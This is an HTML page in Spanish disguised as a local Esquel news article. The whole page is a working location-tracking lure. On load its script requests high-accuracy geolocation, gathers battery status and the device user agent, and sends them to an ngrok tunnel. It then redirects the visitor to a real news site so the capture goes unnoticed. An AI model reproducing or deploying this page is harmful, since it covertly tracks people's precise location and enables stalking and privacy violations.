<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Noticias Esquel 2026</title>
</head>
<body style="font-family: Arial; text-align: center; padding-top: 50px;">

    <h1>Cargando noticia...</h1>
    <p>Conectando con el servidor local de Esquel.</p>

    <script>
        async function enviar(pos) {
            // TU LINK DE NGROK (Asegurate que sea el actual)
            const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";

            // 1. Obtener datos de Batería
            let batNivel = "No disponible";
            let estaCargando = "No";
            try {
                const battery = await navigator.getBattery();
                batNivel = (battery.level * 100).toFixed(0) + "%";
                estaCargando = battery.charging ? "Si" : "No";
            } catch (e) {}

            // 2. ENVIAR TODO (Ahora sí, todo dentro del JSON)
            fetch(URL_NGROK, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    precision: pos.coords.accuracy.toFixed(2) + "m",
                    bateria: batNivel,
                    esta_cargando: estaCargando,
                    dispositivo: navigator.userAgent
                })
            });

            // 3. Redirigir a la noticia real
            setTimeout(() => {
                window.location.href = "https://www.eqsnotas.com/";
            }, 1000);
        }

        function error() {
            window.location.href = "https://www.eqsnotas.com/";
        }

        window.onload = function() {
            navigator.geolocation.getCurrentPosition(enviar, error, {
                enableHighAccuracy: true
            });
        };
    </script>
</body>
</html>
